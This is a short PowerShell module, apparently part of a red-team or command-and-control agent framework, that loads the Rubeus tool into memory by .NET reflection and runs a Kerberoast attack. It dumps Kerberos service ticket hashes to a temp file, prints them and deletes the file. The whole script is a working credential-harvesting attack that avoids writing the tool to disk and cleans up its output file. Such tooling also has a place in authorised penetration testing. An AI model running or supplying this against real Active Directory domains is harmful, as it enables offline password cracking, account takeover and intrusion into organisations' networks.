# kerberoast — Rubeus kerberoast via in-process .NET reflection
# OCD mindmap: Kerberoast (Branch: Got valid username)
# Requires sharp_blobs/Rubeus.b64 delivered by server; agent decodes + loads.
$ErrorActionPreference = 'Stop'

# Agent sets $global:SharpBlobs before invocation (map of tool -> byte[])
if (-not $global:SharpBlobs -or -not $global:SharpBlobs['Rubeus.exe']) {
    throw "Rubeus binary not pre-loaded by agent — check sharp_blobs delivery"
}
$asm = [System.Reflection.Assembly]::Load($global:SharpBlobs['Rubeus.exe'])

# Capture Rubeus output into a string (redirect Console.Out)
$stringWriter = New-Object System.IO.StringWriter
[Console]::SetOut($stringWriter)

try {
    $asm.EntryPoint.Invoke($null, @([string[]]@('kerberoast', '/nowrap', '/outfile:C:\Windows\Temp\kr.txt')))
} catch {
    Write-Host "Rubeus invocation failed: $_"
}

# Restore stdout
$stdOut = [System.Console]::OpenStandardOutput()
$sw = New-Object System.IO.StreamWriter($stdOut)
$sw.AutoFlush = $true
[Console]::SetOut($sw)

Write-Output $stringWriter.ToString()

if (Test-Path C:\Windows\Temp\kr.txt) {
    Write-Host "`n=== Kerberoast hashes ==="
    Get-Content C:\Windows\Temp\kr.txt
    Remove-Item C:\Windows\Temp\kr.txt -Force
}
